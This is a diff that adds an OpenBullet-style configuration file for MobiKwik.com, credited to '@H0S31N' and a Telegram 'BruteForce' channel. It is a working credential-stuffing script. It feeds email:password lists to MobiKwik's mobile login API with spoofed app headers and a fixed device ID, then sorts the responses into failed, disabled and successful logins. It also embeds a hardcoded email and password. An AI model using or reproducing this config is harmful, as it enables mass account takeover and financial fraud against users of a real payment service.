@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "MobiKwik.com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-06-08T14:16:40.3345802+02:00",
+  "AdditionalInfo": "t.me/BruteForce ",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#gu FUNCTION GenerateGUID -> VAR "gu" 
+
+#GUID FUNCTION ToUppercase "<gu>" -> VAR "GUID" 
+
+#Lenght FUNCTION Length "{\\n   \"email\" : \"Hosebyekta@yahoo.com\",\\n   \"deviceId\" : \"7b58bf9479faa3c950609d07e4f2c8d3\",\\n   \"av\" : \"12.5\",\\n   \"remember\" : true,\\n   \"pwd\" : \"Hoseib@Hosein\",\\   \"v\" : \"2\"\\n}" -> VAR "Lenght" 
+
+#Post REQUEST POST "https://appapi.mobikwik.com/api/p/account/login" 
+  CONTENT "{\"email\" : \"<USER>\",\"deviceId\" : \"7b58bf9479faa3c950609d07e4f2c8d3\",\"av\" : \"12.3\",\"remember\" : true,\"pwd\" : \"<PASS>\",\"v\" : \"2\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: appapi.mobikwik.com" 
+  HEADER "Accept: */*" 
+  HEADER "X-App-Ver: 12.5" 
+  HEADER "X-tune-user-ID: <GUID>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "X-MClient: 9" 
+  HEADER "X-Device-ID: 7b58bf9479faa3c950609d07e4f2c8d3" 
+  HEADER "User-Agent: Mobikwik/66 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: close" 
+  HEADER "X-tune-limited-flag: 0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Invalid login ID\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "User is disabled" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true," 
+    KEY "Otp verification required when using new device" 
+
